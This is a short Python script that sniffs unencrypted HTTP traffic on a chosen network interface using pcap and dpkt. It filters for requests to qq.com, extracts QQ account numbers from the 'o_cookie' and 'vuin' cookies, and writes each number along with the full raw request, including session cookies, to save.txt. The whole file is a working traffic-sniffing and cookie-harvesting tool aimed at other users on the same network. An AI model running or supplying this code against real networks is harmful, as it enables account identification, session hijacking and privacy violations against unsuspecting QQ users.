#@author:九世
#@file:zhua.py
#@time:2020/1/20

import pcap
import dpkt
import re

class Huza(object):
    def __init__(self):
        print('[+] 网卡列表')
        self.network=pcap.findalldevs()
        print('='*30)
        for ifaces in self.network:
            print(ifaces)
        print('=' * 30)
        self.qqnumbers=[]

    def jiexi(self,data):
        p=dpkt.ethernet.Ethernet(data) #解析数据包
        if p.data.__class__.__name__=="IP": #第一层数据协议名为IP的时候
           if p.data.data.__class__.__name__=="TCP": #第二层协议名为TCP的时候
               if p.data.data.dport==80: #第二层协议目标端口为80的时候
                    if len(p.data.data.data)!=0:
                        data=p.data.data.data #得到解决后的数据结果
                        if b'qq.com' in data:
                            jxs=re.findall(b'o_cookie=[1-9][0-9]{4,}',data)
                            if len(jxs)>0:
                                if jxs[0] not in self.qqnumbers:
                                    print('[+] qq号:{}'.format(bytes.decode(jxs[0]).replace('o_cookie=','')))
                                    print('[+] qq号:{}'.format(bytes.decode(jxs[0]).replace('o_cookie=', '')),file=open('save.txt','a',encoding='utf-8'))
                                    print('[+] 请求包')
                                    print(data.decode())
                                    print(data.decode().replace('\n',''),file=open('save.txt','a',encoding='utf-8'))
                                    self.qqnumbers.append(jxs[0])
                            else:
                                jxs = re.findall(b'vuin=[1-9][0-9]{4,}', data)
                                if len(jxs)>0:
                                    if jxs[0] not in self.qqnumbers:
                                        print('[+] qq号:{}'.format(bytes.decode(jxs[0]).replace('vuin=','')))
                                        print('[+] qq号:{}'.format(bytes.decode(jxs[0]).replace('vuin=', '')),file=open('save.txt','a',encoding='utf-8'))
                                        print('[+] 请求包')
                                        print(data.decode())
                                        print(data.decode().replace('\n', ''),file=open('save.txt', 'a', encoding='utf-8'))
                                        self.qqnumbers.append(jxs[0])


    def statzhuaqu(self):
        xw=input('网卡选择:')
        try:
            pc=pcap.pcap(r'{}'.format(xw)) #监听指定网卡流量
            pc.setfilter('tcp port 80') #过滤语句
            for ptime,pdata in pc:
                self.jiexi(pdata)
        except KeyboardInterrupt:
            print('Exit,Bye')

if __name__ == '__main__':
    obj=Huza()
    obj.statzhuaqu()